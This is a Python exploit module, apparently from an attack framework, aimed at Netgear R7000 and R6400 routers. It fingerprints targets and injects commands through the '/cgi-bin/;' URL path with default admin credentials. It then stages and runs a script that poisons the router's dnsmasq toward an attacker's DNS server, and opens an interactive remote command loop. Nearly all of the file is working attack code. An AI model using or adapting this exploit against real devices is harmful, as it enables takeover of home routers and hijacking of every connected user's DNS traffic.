#coding: utf-8
'''
@Test list:
Netgear r7000
Netgear r6400
'''
import datetime
from routelib import *
import base64
import time
import httplib
import ssl
import urllib2
from exp_template import *
    
class netgear_r7000_r6400_rce(Exploit):
    def __init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={}):
        self.url = url
        self.taskid = taskid
        self.targetid = targetid
        self.cmd_connect = cmd_connect
        self.data_redirect = data_redirect
        self.dns_server = dns_server
        self.proxies = proxies
        self.log_data = []
        self.shell_data = []
        
    def meta_info(self):
        return {
            'name': 'netgear_r7000_r6400_rce',
            'author': 'z',
            'date': '2018-03-15',
            'attack_type': 'RCE',
            'app_type': 'Router',              #路由器为Router
            'app_name': 'Netgear',
            'min_version': '1.02',
            'max_version': '2.0',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Module exploits remote command execution in Netgear R7000 and R6400 devices. If the target is vulnerable, command loop is invoked that allows executing commands on operating system level.',
            'reference':[
                'http://www.sj-vs.net/a-temporary-fix-for-cert-vu582384-cwe-77-on-netgear-r7000-and-r6400-routers/',
                'https://www.exploit-db.com/exploits/40889/',
                'http://www.kb.cert.org/vuls/id/582384',

            ],   #参考文档
        }
    '''
    'R6400 (AC1750)',
    'R7000 Nighthawk (AC1900, AC2300)',
    'R7500 Nighthawk X4 (AC2350)',
    'R7800 Nighthawk X4S(AC2600)',
    'R8000 Nighthawk (AC3200)',
    'R8500 Nighthawk X8 (AC5300)',
    'R9000 Nighthawk X10 (AD7200)',
    '''
        
    def exploit(self):
        if self.check():
            if True:#not self.check(True):
                self.report("Target might be vulnerable - it is hard to verify")
            else:
                self.report("Target be vulnerable")
            self.report("It is blind command injection, response is not available",Level.warming)
            self.report("DNS Poisoning...")
            #self.command_stager()
            self.dns_poison()
            self.command_stager()

        else:
            self.report("Target is not vulnerable",Level.warming)
        self.report('Exploit is complete')

    def dns_poison(self, dns_conf_path='/tmp/resolv.conf', restart_cmd='dnsmasq -h -n -c 0 -N -i br0 -r /tmp/resolv.conf -u -r'):
        every_send = 10
        completed = 0
        dns_handle = dns.dnsmasq_poison(self.dns_server,dns_conf_path,restart_cmd)
        #dns_handle.set_debug_mode()
        dns_shell = dns_handle.get_netgear_dns_poison_shell_cmds(every_send)
        wf = dns_shell['script_name']
        total_size = dns_shell['size']
        for cmd in dns_shell['cmds']:
            completed += every_send
            #print cmd
            self.execute(cmd)
            if completed >= total_size:
                completed = total_size
            self.report('Command Stager progress - %.2f%% done (%d/%d) bytes' % (float(completed)/total_size*100, completed, total_size))

        chmod_dns_shell = 'chmod +x %s && echo' % wf
        dns_conf_path = dns_conf_path.replace("/",'"$HOME"')
        restart_cmd = restart_cmd.replace("/",'"$HOME"')
        execute_dns_shell = '%s && echo' % (wf)
        execute_dns_shell = execute_dns_shell.replace(" ","$IFS")

        self.report('Command: "%s" done.' % chmod_dns_shell)
        self.execute(chmod_dns_shell)
        #print execute_dns_shell
        self.report('Command: "%s" done.' % execute_dns_shell)

        result = self.execute(execute_dns_shell)

    def command_stager(self):
        while True:
            cmd = raw_input("# ")
            if cmd in ['exit', 'quit']:
                return
            #self.report(self.execute(cmd))
            self.execute(cmd)

    def execute(self, cmd):
        #req = session()
        time.sleep(0.5)
        cmd = cmd.replace(" ", "$IFS")
        url = "{}/cgi-bin/;{}".format(self.url, cmd)
        header = {
            'User-Agent'        :   'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36',
            'Accept-Encoding'   :   'gzip, deflate, sdch',
            'Connection'        :   'keep-alive',
            'Authorization'     :   'Basic %s' % base64.b64encode('admin:admin'),
            'Accept'            :   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        }
        response = None

        ssl._create_default_https_context = ssl._create_unverified_context()
        context = ssl._create_unverified_context()
        #'''

        req0 = urllib2.Request(url,headers=header)

        try:
            response_h = urllib2.urlopen(req0,context=context, timeout=5)
            response = response_h.read()
        except urllib2.URLError, e:
            #import traceback
            #print traceback.print_exc()
            import socket
            if isinstance(e.reason,socket.timeout):
                return '>timeout<'
        except ssl.SSLError, e:
            #import traceback
            #print traceback.print_exc()
            return ""
        except httplib.BadStatusLine:
            self.report('Exploit sent done',Level.debug)
            return ""
        except:
            #import traceback
            #print traceback.print_exc()
            return ""


        '''
        req = session()
        try:
            pass
            # stream=True
            #response.raw_read(10)
            response = req.get(url)
        except requests.Timeout as err:
            pass
            self.report(err.message,Level.warming)
        except requests.ConnectionError as err:
            #pass
            # ('Connection aborted.', BadStatusLine("''",))
            #self.report(err.message,Level.warming)

            if err.message[1].__class__ is httplib.BadStatusLine:
                #self.report("BadStatusLine",Level.debug)
                return "BadStatusLine, Maybe Vulnerable..."
        #time.sleep(1)
        if response == None:

            return ""
        #'''
        if response is None:
            return ""
        #print response
        #time.sleep(0.3)
        return response.content.strip()

    def check(self,ensure=False):
        if not ensure:
            req = session()
            check_status = False
            url = "{}/".format(self.url)
            response = None

            try:
                response = req.get( url=url)
            except requests.Timeout as err:
                pass
                self.report(err.message,Level.warming)
            except requests.ConnectionError as err:
                pass
                self.report(err.message,Level.warming)

            if response is None:
                return False  # target is not vulnerable

            if "WWW-Authenticate" in response.headers.keys():
                if any(map(lambda x: x in response.headers['WWW-Authenticate'], ["NETGEAR R7000", "NETGEAR R6400"])):
                    return True  # target is vulnerable

            return False  # target is not vulnerable
        else:
            #ensure
            delay = 2   #need less than timeout
            cmd = "sleep '{}'".format(delay)
            response = None
            start_time = time.time()
            response = self.execute(cmd)
            blind_inject_time = int(time.time() - start_time)
            self.report('Target Check takes {} seconds.'.format(blind_inject_time))

            if blind_inject_time >= delay and '>timtout<' not in response:
                return True  # target is not vulnerable

            return False  # target is not vulnerable
        
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print 'Usage(e.g.): dir_300_600_rce.py http://192.168.0.1:8080 119.6.6.6'
        exit(0)
    e = netgear_r7000_r6400_rce(sys.argv[1],dns_server=sys.argv[2])
    e.exploit()
        
        
        
